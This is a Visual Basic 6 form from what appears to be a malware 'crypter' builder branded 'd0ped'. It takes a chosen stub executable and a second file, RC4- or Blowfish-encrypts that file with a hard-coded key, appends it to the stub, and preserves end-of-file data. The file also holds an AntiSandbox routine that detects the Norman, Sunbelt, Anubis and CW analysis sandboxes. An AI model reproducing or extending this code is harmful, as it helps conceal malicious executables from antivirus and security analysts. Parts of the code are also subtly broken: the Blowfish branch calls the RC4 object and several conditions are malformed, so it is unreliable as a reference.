VERSION 5.00
Object = "{A8E5842E-102B-4289-9D57-3B3F5B5E15D3}#13.1#0"; "CODEJO~3.OCX"
Begin VB.Form frmEncOptions 
   BackColor       =   &H00000000&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Encryption Method"
   ClientHeight    =   1905
   ClientLeft      =   5880
   ClientTop       =   4665
   ClientWidth     =   2895
   Icon            =   "frmEncOptions.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   1905
   ScaleWidth      =   2895
   Begin XtremeSuiteControls.RadioButton Option2 
      Height          =   255
      Left            =   720
      TabIndex        =   3
      Top             =   840
      Width           =   255
      _Version        =   851969
      _ExtentX        =   450
      _ExtentY        =   450
      _StockProps     =   79
      Caption         =   "RadioButton2"
      UseVisualStyle  =   -1  'True
   End
   Begin XtremeSuiteControls.RadioButton Option4 
      Height          =   255
      Left            =   720
      TabIndex        =   1
      Top             =   360
      Width           =   255
      _Version        =   851969
      _ExtentX        =   450
      _ExtentY        =   450
      _StockProps     =   79
      Caption         =   "RadioButton1"
      UseVisualStyle  =   -1  'True
   End
   Begin XtremeSuiteControls.PushButton Command1 
      Height          =   375
      Left            =   840
      TabIndex        =   0
      Top             =   1320
      Width           =   1335
      _Version        =   851969
      _ExtentX        =   2355
      _ExtentY        =   661
      _StockProps     =   79
      Caption         =   "Crypt"
      UseVisualStyle  =   -1  'True
   End
   Begin VB.TextBox Text2 
      BackColor       =   &H00000000&
      ForeColor       =   &H00FFFFFF&
      Height          =   285
      Left            =   1200
      TabIndex        =   4
      Text            =   "Blow Fish"
      Top             =   840
      Width           =   855
   End
   Begin VB.TextBox Text1 
      BackColor       =   &H00000000&
      ForeColor       =   &H00FFFFFF&
      Height          =   285
      Left            =   1200
      TabIndex        =   2
      Text            =   "RC4"
      Top             =   360
      Width           =   855
   End
   Begin VB.Line Line3 
      BorderColor     =   &H00FF0000&
      X1              =   0
      X2              =   0
      Y1              =   -240
      Y2              =   1680
   End
End
Attribute VB_Name = "frmEncOptions"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Const u = "gdsa·$&/ALREOJFSFSDFS)P(ñp8o´&%IPSQAE)(&Ksfdahdfs$&ESDFASDMRHP/(GASDHGASYZTGRESDDSA)%TagYEFFAHADFJDGL /asgsdfSDAa*=)jfgASDGASsjkhf/)O%$&(K~¬€¬kjdhgkghdkdg¬&%(=hadhdfga=$·&gjhsdfjsa/"

Private Sub Command1_Click()
With i.cd
.Filter = "Executables (*.exe)|*.exe"
.DialogTitle = "Choose a Stub."
.ShowOpen
End With
If i.cd.Filename = "" Then
MsgBox "Choose a Stub.", vbInformation, "d0ped"
Exit Sub
End If

With i.ki
.Filter = "Executables (*.exe)|*.exe"
.DialogTitle = "Choose the output file location."
.ShowSave
End With

If i.Check1.Value = 1 Then
Dim eof As String
eof = ReadEOFData(i.cm.Filename)
End If

Open i.cd.Filename For Binary As #1
Dim tub As String
tub = Space(LOF(1))
Get #1, , tub
Close #1

Open i.cm.Filename For Binary As #1
Dim se As String
se = Space(LOF(1))
Get #1, , se
Close #1

Dim es As String, cls As String


If Option4.Value = True Then
Dim C As New clsRC4
cls = C.EncryptString(se, u)
es = 3
End If

If Option2.Value = True Then
Dim b As New clsBlowFish
cls = C.EncryptString(se, u)
es = 4
End If

Open i.ki.Filename For Binary As #4
Put #4, , tub & u
Put #4, , es & u
Put #4, , cls & u
Close #4

If i.Check1.Value = 1 Then

Call WriteEOFData(ki.Filename, eof)

End If

MsgBox "File crypted!", vbInformation, "d0ped"
End Sub

Public Function AntiSandbox() As String

        If Environ("username") = "currentuser" Then
        MsgBox "Norman Sandbox Detected"
        End
        End If

        If App.Path = "C:\" & App.EXEName = "file" Then
        MsgBox "Sunbelt Sandbox Detected"
        End
        End If

        If App.EXEName = "Sample" Or Environ("username") = "andy" Or "Andy" Then
        MsgBox "Anubis Sandbox Detected"
        End
        End If

        If App.Path = "C:\" Or "D:\" Or "F:\" Or "X:\" & Environ("username") = "Schmidti" Then
        MsgBox "CW Sandbox Detected"
        End
        End If
End Function
